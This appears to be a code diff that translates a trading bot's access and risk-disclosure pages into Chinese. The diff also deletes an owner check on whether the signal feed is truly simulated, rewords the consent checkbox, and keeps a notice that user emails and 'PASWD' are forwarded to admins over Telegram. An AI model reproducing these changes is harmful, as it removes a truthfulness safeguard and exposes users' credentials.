@@ -121,7 +121,7 @@ function Home() {
         <footer className="access-footer">
           <a href="#help" onClick={(e) => e.preventDefault()}><Headphones />Help &amp; Support</a>
           <i />
-          <Link href="/terms" data-testid="link-terms"><FileText />Terms &amp; Risk Disclosure</Link>
+          <Link href="/terms" data-testid="link-terms"><FileText />条款与风险披露</Link>
         </footer>
         <div className="health-note" data-testid="status-api-health">
           <span className={online ? 'health-dot online' : 'health-dot'} />
@@ -137,44 +137,43 @@ function Terms() {
   const sections = [
     {
       number: '01',
-      title: 'Trading losses',
-      text: 'Markets can move quickly and unpredictably. You may lose some or all of the capital you trade. Leverage, if used, can magnify losses and may trigger liquidation. Only trade with money you can afford to lose.',
+      title: '交易亏损',
+      text: '市场可能快速且不可预测地波动。您可能损失部分或全部交易本金。若使用杠杆，损失可能会扩大，并可能导致强制平仓。请仅使用您能承受损失的资金进行交易。',
     },
     {
       number: '02',
-      title: 'No guarantee or personal advice',
-      text: 'No profit or signal accuracy is guaranteed. Past, hypothetical, and simulated results do not predict future results. Content here is not personal investment advice. You are responsible for your own decisions.',
+      title: '不保证收益，也不提供个性化建议',
+      text: '不保证盈利，也不保证信号准确。过去、假设或模拟的结果不能预测未来表现。本页面内容不构成个性化投资建议。您需对自己的决策负责。',
     },
     {
       number: '03',
-      title: 'Demo and live trading',
-      text: 'The supplied design describes the signal feed as simulated DEMO. Simulated results can differ from live execution because of liquidity, slippage, spreads, fees, delays, and changing market conditions.',
-      note: 'Owner check before publishing: verify that the signal feed is in fact simulated DEMO.',
+      title: '模拟交易与实盘交易',
+      text: '当前信号源为模拟的 AUTO BOT FEED。由于流动性、滑点、点差、费用、延迟及市场条件变化，模拟结果可能与实盘执行结果不同。',
     },
     {
       number: '04',
-      title: 'AI and automation',
-      text: 'Signals or automated execution may be wrong or delayed, or affected by stale data, settings, software faults, or unusual market conditions. Automation does not remove the need to monitor activity.',
+      title: '人工智能与自动化',
+      text: '信号或自动执行可能出错或延迟，也可能受过时数据、设置、软件故障或异常市场状况影响。自动化并不意味着无需监控交易活动。',
     },
     {
       number: '05',
-      title: 'Execution and markets',
-      text: 'Volatility, price gaps, low liquidity, partial or missed orders, spreads, slippage, broker or exchange restrictions, fees, outages, and margin calls can affect outcomes. Liquidation may occur where applicable.',
+      title: '订单执行与市场',
+      text: '波动、价格跳空、流动性不足、订单部分成交或未成交、点差、滑点、经纪商或交易所限制、费用、服务中断以及追加保证金通知都可能影响结果。适用时可能发生强制平仓。',
     },
     {
       number: '06',
-      title: 'Technology and third parties',
-      text: 'Internet, hosting, data-provider, broker, or exchange outages and errors may disrupt service or execution. Cybersecurity incidents, third-party terms, and custody arrangements also carry risks. Uninterrupted availability is not promised.',
+      title: '技术与第三方服务',
+      text: '互联网、托管服务、数据提供商、经纪商或交易所发生中断或错误，可能影响服务或交易执行。网络安全事件、第三方条款及资产托管安排也存在风险。无法保证服务始终可用。',
     },
     {
       number: '07',
-      title: 'Account security',
-      text: 'Protect your accounts and credentials. Never send passwords, recovery phrases, exchange API secrets, or verification codes from email, SMS, or other services through Telegram. The app-issued bot access PIN is only used to continue through this page.',
+      title: '账户安全',
+      text: '请保护您的账户和凭证。切勿通过 Telegram 发送密码、恢复短语、交易所 API 密钥，或来自电子邮件、短信或其他服务的验证码。本页面中的机器人访问 PIN 仅用于继续此页面。',
     },
     {
       number: '08',
-      title: 'Law and taxes',
-      text: 'Availability, eligibility, financial rules, licensing, and tax obligations vary by location. Check the laws that apply to you and seek qualified legal or tax advice where needed.',
+      title: '法律与税务',
+      text: '服务可用性、资格要求、金融监管规则、牌照要求及税务义务因所在地而异。请核实适用于您的法律法规，必要时咨询合格的法律或税务顾问。',
     },
   ];
 
@@ -183,7 +182,7 @@ function Terms() {
       <div className="terms-frame">
         <header className="terms-header">
           <button type="button" className="terms-back" onClick={() => setLocation('/')} data-testid="button-back-home">
-            <ArrowLeft size={17} /> Back to access
+            <ArrowLeft size={17} /> 返回访问页
           </button>
           <div className="terms-brand">
             <img src="/assets/logo.png" alt="" />
@@ -192,34 +191,33 @@ function Terms() {
         </header>
 
         <section className="terms-intro">
-          <div className="terms-kicker"><FileText size={15} /> BEFORE YOU PROCEED</div>
-          <h1>Terms &amp; <em>Risk Disclosure</em></h1>
-          <p className="terms-lede">A clear summary of important risks to consider before using automated trading tools.</p>
+          <div className="terms-kicker"><FileText size={15} /> 请在继续前阅读</div>
+          <h1>条款与<em>风险披露</em></h1>
+          <p className="terms-lede">使用自动交易工具前，请仔细了解以下重要风险。</p>
           <div className="terms-notice" role="note" data-testid="notice-general-risk">
             <span className="terms-notice-icon"><AlertTriangle size={20} /></span>
-            <p>This is a general risk summary, not legal, tax, or investment advice, and not a complete Terms of Service. It may not cover every risk or meet requirements in your jurisdictions. Have qualified legal counsel review it before public use or live-money trading.</p>
+            <p>本页面仅概述一般风险，不构成法律、税务或投资建议，也不构成完整的服务条款。内容可能未涵盖所有风险，亦不一定符合您所在司法管辖区的要求。在公开使用或进行真实资金交易前，请咨询合格的法律顾问。</p>
           </div>
           <div className="terms-notice terms-data-notice" role="note" data-testid="notice-payment-data">
             <span className="terms-notice-icon"><ShieldCheck size={20} /></span>
-            <p>Your email and PASWD are sent to authorized bot admins through Telegram for payment review. Do not submit passwords, card or bank details, or verification codes from email, SMS, or another service. Submitted payment details are cleared from this app after review or expiry; Telegram may retain its own copies under its policies.</p>
+            <p>您提交的邮箱和 PASWD 会通过 Telegram 发送给经授权的机器人管理员，用于付款审核。请勿提交密码、银行卡或银行账户信息，或来自电子邮件、短信或其他服务的验证码。审核完成或请求过期后，本应用会清除您提交的付款信息；Telegram 可能根据其政策保留副本。</p>
           </div>
         </section>
 
         <div className="terms-body">
           <aside className="terms-side-note">
-            <span className="terms-side-index">PLEASE READ</span>
-            <p>Trading tools can make activity faster. They cannot make markets predictable or remove risk.</p>
+            <span className="terms-side-index">请仔细阅读</span>
+            <p>交易工具可能提高操作速度，但无法预测市场或消除风险。</p>
             <span className="terms-side-rule" />
-            <span className="terms-side-foot">GENERAL RISK SUMMARY</span>
+            <span className="terms-side-foot">一般风险摘要</span>
           </aside>
-          <section className="terms-list" aria-label="Risk topics">
+          <section className="terms-list" aria-label="风险主题">
             {sections.map((section) => (
               <article className="terms-section" key={section.number} data-testid={`section-risk-${section.number}`}>
                 <span className="terms-number">{section.number}</span>
                 <div>
                   <h2>{section.title}</h2>
                   <p>{section.text}</p>
-                  {section.note && <p className="terms-owner-note"><strong>Owner verification required.</strong> {section.note.replace('Owner check before publishing: ', '')}</p>}
                 </div>
               </article>
             ))}
@@ -227,9 +225,9 @@ function Terms() {
         </div>
 
         <footer className="terms-footer">
-          <p>Take time to understand the risks before continuing.</p>
+          <p>继续之前，请花时间了解相关风险。</p>
           <button type="button" onClick={() => setLocation('/')} data-testid="button-return-access">
-            <ArrowLeft size={17} /> Return to access
+            <ArrowLeft size={17} /> 返回访问页
           </button>
         </footer>
       </div>
@@ -312,9 +310,9 @@ function Login() {
           />
           <div>
             <label htmlFor="payment-review-consent">
-              I agree to do this
+              I want to start bot
             </label>
-            <Link href="/terms">Terms &amp; Disclosure</Link>
+            <Link href="/terms">条款与风险披露</Link>
           </div>
         </div>
         {formError && <p className="payment-feedback error" role="alert">{formError}</p>}
